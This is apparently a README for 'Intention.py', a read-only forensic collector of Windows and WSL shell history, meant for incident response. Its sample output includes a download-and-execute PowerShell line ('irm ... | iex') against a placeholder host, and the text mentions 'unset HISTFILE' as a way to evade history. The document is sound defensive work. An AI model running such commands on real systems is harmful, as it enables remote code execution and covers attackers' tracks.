# Intention.py

Read-only collector of **interactive command-line history** on Windows, plus
the installation and configuration facts needed to interpret it.

Version 1.4.1 · Python 3.10+ · stdlib only (`rich` optional)

---

## What it collects

Strings a human typed, pasted, or entered at an interactive shell prompt — on
Windows itself and in the POSIX environments living beside it.

- **CMD family** — live `doskey /history`, Clink, Cmder, ConEmu (only a sibling
  history file, never the settings XML), Windows Terminal
- **PowerShell** — every PSReadLine host: ConsoleHost, VS Code, ISE, pwsh 7+
- **POSIX-on-Windows** — bash / zsh / fish / ash under Git for Windows, MSYS2,
  Cygwin
- **WSL** — distro inventory from the `Lxss` registry key; WSL1 rootfs directly;
  WSL2 via `\\wsl$` only when the share already answers
- **Esoteric shells** — nushell (plaintext *and* SQLite), xonsh, elvish, oils,
  ion
- **Atuin** — the SQLite history database that replaces shell history entirely
- **Installations** — was this terminal ever installed here, even if since
  removed
- **Configuration policy** — where history is declared to be written, and
  whether it is suppressed or destroyed

## What it deliberately does not collect

Explorer MRU (RunMRU, TypedPaths, ComDlg32, WordWheelQuery) is UI intent, not
command-line history, and is available only behind `--legacy-explorer`.
Language REPLs are not shells and need `--include-repls`.

Never collected at all: ShellBags, UserAssist, Jump Lists, LNK, Prefetch,
BAM/DAM, AmCache, Shimcache, SRUM, Event Log 4688/4103/4104, script-block
logging, transcripts, browser or Office MRU, clipboard. No hooking, no
keylogging, no process memory access.

From configuration files it reads **only** lines governing history location and
history destruction. `$PATH`, aliases, functions, prompts and exported
credentials are never captured.

---

## Reading the output

A run prints an inventory, the two configuration tables, the artifact paths it
read, and finally the path to the full report. The console is triage; **the
`.txt` report is the record** and contains every row.

### Presence column

| Value | Meaning |
|---|---|
| `Present (n entries)` | history recovered |
| `None detected` | checked, nothing found — a result, not a gap |
| `Not checked` | excluded by `--sources` |
| `Volatile - not persisted` | native cmd.exe: history lives in the conhost session buffer and never reaches disk |

### Installed column

`Installed` is a **lead, not a fact**: install dates and file MTIMEs shift with
servicing stacks and updates and are trivially settable, and confirming one
needs a Volume Shadow Copy or `windows.old` differential that this tool does
not acquire. Package-manager entries are additionally marked `installed` /
`remnant` / `ambiguous` from what the directory actually contains — an empty
chocolatey `lib` folder or a scoop app directory with no binary is leftovers,
not an install.

It means a real installation record was found: registry (HKLM/HKCU
Uninstall, WOW6432Node, MSI InstallProperties) or a package manager (`scoop`,
`scoop (global)`, `chocolatey`, `winget (portable)`, `cargo`, `pip/conda`).
A date from the registry is the installer's own `InstallDate`; a date from a
package manager is the package directory's creation time. `yes` means a record
with no date, `built-in` means it ships with Windows.

**A dash is not proof the software was never installed.** A clean uninstall
usually removes the Uninstall key, and manually extracted or portable builds
register nothing anywhere.

### Privilege context

Each collected profile carries a privilege context derived from its SID:
`system` (S-1-5-18) · `service` (S-1-5-19/20) · `builtin-administrator`
(RID 500) · `user` · `unknown`. History under the SYSTEM profile could only
have been written by a process running as SYSTEM — that is factual, and it is
the post-escalation artifact worth looking for. SYSTEM and service profiles
live outside `C:\Users`, so they are discovered through the registry
ProfileList and collected by default.

**There is deliberately no `elevated` value.** Windows UAC uses a split token:
an administrator's elevated and non-elevated shells write to the *same*
history file. Whether a given session was elevated is **not recoverable** from
these artifacts. A SID identifies an account, never a person — anyone may be
using an account.

### The `who` column

Most history artifacts carry no per-command time, so identity is the axis that
remains usable. Each row in a per-source table shows `<privilege>:<account>`
between `when` and `t`:

```
    #  when                 who               t       command
    1  -                    usr:jdoe          order   irm https://example/get | iex
    2  2026-01-02 03:04:05  system:SYSTEM     exact   whoami /priv
```

The full SID is printed once in the artifact header rather than on every row,
since rows are grouped by artifact and each artifact belongs to one profile.
The banner's `Collector elevated` field describes **this tool's own token**,
never a property of a collected session.

### Absence is demonstrated, not asserted

Every candidate path is probed and its outcome recorded: `read_ok` ·
`path_absent` · `present_but_empty` · `present_unreadable` ·
`permission_denied`.

A zero-byte `.bash_history` is reported as an **empty artifact**, not as
absence — something truncated or cleared it, which is the opposite claim from
the file never existing. A path that could not be read is reported as
`Unreadable - not answered`, never as `None detected`: a failed read means
nobody looked successfully.

### Timestamp provenance — read this before trusting any time

Every row carries `timestamp_provenance`. In the report it appears as a short
tag in the `t` column.

| Provenance | Tag | Meaning |
|---|---|---|
| `clink_embedded_epoch` | `exact` | Clink wrote a per-command time |
| `histtimeformat_epoch` | `exact` | the shell wrote it: bash `HISTTIMEFORMAT`, zsh `EXTENDED_HISTORY`, fish `when:` |
| `db_recorded_epoch` | `exact` | a history database recorded it, with cwd / exit status |
| `file_mtime_last_append_only` | `~last` | file MTIME — applies to the **last appended line only** |
| `key_lastwrite_most_recent_only` | `~key` | registry key LastWrite — the most recent MRU entry only |
| `file_ctime` | `~ctime` | artifact creation time |
| `order_only` / `mru_index_only_no_time` | `order` | position only; no time was recorded |
| `collection_time_only` | `live` | observed at collection time (live doskey buffer) |
| `unavailable` | `n/a` | an inventory or configuration record, not a typed command |

**A blank timestamp means the artifact carried no time and none was invented.**
Assigning file MTIME to every line of a history file is the most common way
these artifacts get misread; this tool refuses to do it.

### ATT&CK techniques table

Beneath the inventory, the tool maps what it observed to MITRE ATT&CK
techniques — `Technique | Tactic | Observed because`. Every row names the
concrete evidence that produced it, and a technique with no supporting
observation in that run does not appear, so an empty table is a correct result
on a clean host. The ATT&CK version the mapping was authored against is printed
in the header, so a stale mapping is visible rather than silent.

| Observation | Technique |
|---|---|
| CMD / Clink / Cmder / ConEmu history | T1059.003 Windows Command Shell |
| PSReadLine history | T1059.001 PowerShell |
| bash / zsh / fish / ash history (ports or WSL) | T1059.004 Unix Shell |
| nushell / xonsh / elvish / oils / ion history | T1059 Command and Scripting Interpreter |
| WSL distro registered | T1202 Indirect Command Execution |
| Config declares history destruction | T1070.003 Clear Command History |
| Any shell history recovered | T1552.003 Shell History |

**Techniques only. The tool makes no attribution claims** — no threat groups,
no `G####` identifiers, no campaign names, anywhere in any output. ATT&CK has
no sub-technique for zsh, fish, nushell, xonsh or elvish; they collapse into
T1059.004 or the T1059 parent, so a group list attached to those techniques
would describe the whole bucket rather than the shell that was found, and would
invite specificity the evidence does not support.

**Presence is not malice.** These techniques describe what the observed
artifacts *could* support, not that an intrusion occurred. Most hosts running
Git Bash are running Git Bash. The one row that rests on a deliberate act is
T1070.003, which fires on declared configuration rather than inference — and
even that has innocent explanations.

The obscure shells are worth reading correctly: they are a **detection gap**,
not a documented adversary tool. Shell built-ins spawn no process, so a `cd`,
loop or redirect inside them produces no process-creation event (4688 /
Sysmon 1) at all, and their history formats are not parsed by standard tooling.
Their presence indicates a developer or power user. Adversaries invoke a shell
rather than inherit one, and they invoke the lowest common denominator
(`/bin/sh`, `cmd.exe`) because tradecraft assuming nushell exists fails almost
everywhere.

### TIMELINE section

The report carries a cross-source timeline containing **only** entries the
shell itself timestamped, merged across every source and sorted ascending,
with the privilege context on each line. Rows whose artifact recorded no time
are excluded by construction, and the header says how many — a timeline built
from `order_only` rows would present a sequence that was never recorded.
Per-source coverage ("1 of 3 entries carry exact times") tells you how thin
the timeline is before you read it.

### History location table

Where each shell *declares* its history is written, and what kind of volume
that is: `fixed` · `removable` · `remote` · `cloud-sync` · `null-device` ·
`absent/unmounted` · `unknown`. A `(*)` marks a declared path that was not
among the artifacts actually collected — the history may be on a USB stick or
a share rather than this machine.

These are **declared, not effective**. Shell precedence and conditional guards
are not evaluated.

### History policy table

Configuration that changes what survives: `relocates` · `suppresses` ·
`clears-on-exit` · `filters` · `limits` · `preserves` · `default`.
`clears-on-exit` comes from `.bash_logout` / `.zlogout`, a `PROMPT_COMMAND`, or
an EXIT trap. `preserves` settings (`HISTTIMEFORMAT`, `EXTENDED_HISTORY`) are
recorded too — they explain why some rows have exact times.

### WSL history_access

`wsl1_ntfs_path` · `wslpath_online` · `vhdx_unmounted` · `missing`.
WSL2 history lives inside `ext4.vhdx`; the VHDX is inventoried, never mounted
read-write.

---

## What absence means

This is the tool's central claim, and it cuts in several directions:

- Absence of rows is not evidence that no shell ran. Non-interactive, service,
  scheduled-task, WinRM and in-process runspace activity leave no history.
- bash normally flushes history on a clean `exit`; a window closed with the X
  button can lose the entire session.
- A command typed with a leading space is never recorded (bash `HISTCONTROL`,
  Clink `history.ignore_space`, on by default).
- Absence of suppression configuration is not evidence of absence: an
  interactive `unset HISTFILE` leaves no trace in any file.

Clink is a partial exception worth knowing: it marks a deleted entry by
overwriting its first character with `|` rather than removing the line, so
deleted entries are **recoverable** until `clink history compact` runs. They
appear flagged with a leading `?` for the destroyed character.

---

## Read-only guarantees, and their limits

- No registry writes, no history truncation, no `wsl --shutdown`, no writing
  into `\\wsl$`, no VHDX mounting or compaction.
- SQLite databases are opened immutable, or via a temp copy when a `-wal` is
  present. Content and mtime are verified unchanged by the selftest.
- Output files are created exclusively, so a pre-planted symlink at the report
  path cannot be followed.
- History and config files reached through a symlink or junction pointing
  outside their discovery root are refused and recorded in `CollectionErrors`.

**Limit:** on a live machine, reading a file updates its access time. Run
against an image or accept that atime moves. `--wsl-exec` is the one option
that changes state — it starts a stopped distro — and it warns before doing so.

---

## Usage

```
python Intention.py                      # current user, report written to CWD
python Intention.py --diagnose           # probe the Windows-only paths, report, exit
python Intention.py --all-users          # every profile under C:\Users
python Intention.py --outdir C:\cases\01 # report + JSON + CSV there
python Intention.py --selftest           # 288 assertions, no host access
```

Useful flags: `--sources cmd,powershell,bash,wsl,esoteric,config` ·
`--json --csv --html` · `--tables` (full per-source tables in the terminal) ·
`--redact-secrets` (off by default — forensic default is verbatim) ·
`--localtime` · `--chronological` · `--legacy-explorer` · `--include-repls` ·
`--wsl-online` / `--wsl-offline` / `--wsl-exec`.

The `.txt` report is always written. `--txt` is retained as a no-op for
compatibility.

### A note on the CSV

Shell history is attacker-influenceable — anyone with shell access chooses what
lands in it. Cells beginning `=`, `+`, `-`, `@`, tab or CR are prefixed with an
apostrophe in the **CSV only**, so a planted spreadsheet formula cannot execute
when the CSV is opened. The JSON export and the `.txt` report keep the
byte-exact original.

---

## `--diagnose`

Most of this tool is verified by `--selftest` on any platform. A handful of
paths cannot be: they call Win32 APIs, read the live registry, or depend on
NTFS semantics with no POSIX equivalent. `--diagnose` exercises exactly those
and reports what they actually did.

It probes console encoding and code page, `system32_binary()` resolution,
`GetDriveTypeW` for every attached drive, junction detection against
directories Windows itself creates as junctions, live registry enumeration,
`\\wsl$` share visibility, the Clink history format, and which discovery roots
exist on the host.

`OK` / `FAIL` / `SKIP` / `INFO`. **`SKIP` is an unanswered question, not a
defect** — it means the probe needs Windows. A non-zero exit means something
the tool depends on did not behave as designed.

It collects no history, writes no report, and **prints no command text or file
contents** — history lines are reported by shape and length only.

It is, however, **host-identifying**: the output carries the hostname, profile
paths (which contain the account name), the installed-software picture and
drive letters. That is deliberate — those paths are the finding — but it means
the output is safe to send to someone you would already tell those things, not
safe to publish. The Clink probe is the one that
resolves the standing format unknown: with `clink set history.time_stamp save`
enabled, it reports whether epoch comment lines actually appear on disk.

## Known-unverified

Stated plainly rather than buried:

- **Clink timestamp encoding.** The parser assumes `history.time_stamp` writes
  readline-style `# <epoch>` comment lines. Clink documents the setting but not
  the on-disk format, and no sample with timestamps enabled has been examined.
  Rows tagged `clink_embedded_epoch` rest on that assumption; the report says
  so in the CMD-Clink section.
- **Windows execution.** Development and testing were done on Linux. Logic is
  covered by fixtures, but these have never executed against real Windows:
  `system32_binary()`, reparse-point detection (junctions are not POSIX
  symlinks), `GetDriveTypeW` (the drive-type *mapping* is asserted; the Win32
  call is not), the Windows console encoding path, live `winreg` enumeration,
  `\\wsl$` access, and `--wsl-exec`.

---

## Authorized use

Incident response, insider-threat review, and triage of hosts you are
authorized to examine. Shell history routinely contains credentials, connection
strings and tokens — treat the output as sensitive evidence.
